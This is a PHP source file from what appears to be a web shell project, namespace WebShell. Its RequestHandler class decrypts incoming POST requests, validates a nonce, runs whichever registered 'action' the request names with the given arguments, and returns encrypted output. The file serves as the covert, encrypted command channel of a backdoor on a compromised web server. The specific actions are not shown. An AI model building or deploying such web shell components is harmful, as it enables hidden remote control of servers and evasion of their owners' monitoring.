<?php
namespace WebShell;

class RequestHandler extends Singleton
{
    private $actions = [];

    public function addAction(string $key, Action $action): void
    {
        $this->actions[$key] = $action;
    }

    public function handle(): ?string
    {
        // Prepare request object
        $request = $this->unpackRequest();

        // Validate the request and decrypt body
        $body = null;

        if ($this->validateRequest($request)) {
            // Process the request
            [
                'code' => $code,
                'body' => $body
            ] = $this->processRequest($request);

        } else {
            // Set 403 status code 
            $code = 403;
        }

        // Build the response
        return $this->buildResponse($code, $body);
    }

    private function unpackRequest(): Request
    {
        // Get request body
        $payload = json_decode(file_get_contents('php://input'));

        // Decrypt request body
        $iv = base64_decode($payload->iv);
        $encryptedBody = $payload->body;
        $jsonBody = SecurityService::getInstance()->decrypt($encryptedBody, $iv);

        // If the body cannot be decripted, return empty request. Otherwise, populate its values
        if ($jsonBody !== '') {
            $body = json_decode($jsonBody);
            $request = new Request(
                $_SERVER['REMOTE_ADDR'],
                property_exists($body, 'action') ? $body->action : null,
                property_exists($body, 'args') ? $body->args : null,
                property_exists($body, 'nonce') ? $body->nonce : null
            );
        } else {
            $request = new Request();
        }

        return $request;
    }

    private function validateRequest(Request $request): bool
    {
        return SecurityService::getInstance()->validate($request);
    }

    private function processRequest(Request $request): array
    {
        // Declare an empty response
        $body = null;

        // Attempt to handle the action. If an error occurs, set status code 500
        try {
            // Check if there is an appropriate handler configured
            if (array_key_exists($request->getAction(), $this->actions)) {
                // Call the appropriate action
                $body = [];
                $body['output'] = $this->actions[$request->getAction()]->run($request->getArgs());
                $code = 200;
            } else {
                $code = 404;
            }
        } catch (\Exception $e) {
            $code = 500;
        }

        return [
            'code' => $code,
            'body' => $body,
        ];
    }

    private function buildResponse(int $code, ?array $body = null): ?string
    {
        // Initialize variables
        $response = null;
        $securityService = SecurityService::getInstance();

        // Set the Content-Type header
        header('Content-Type: application/json');

        // Set the response code
        http_response_code($code);

        // If a body is supplied, add the nonce, if not, create a body with the nonce
        if (!is_null($body)) {
            $body['nonce'] = $securityService->getNonce();
        } else {
            $body = [ 'nonce' => $securityService->getNonce() ];
        }

        // Encrypt the body and build the response
        $encryptedBody = $securityService->encrypt(json_encode($body));
        $response = json_encode($encryptedBody);

        // Return the response
        return $response;
    }
}
?>
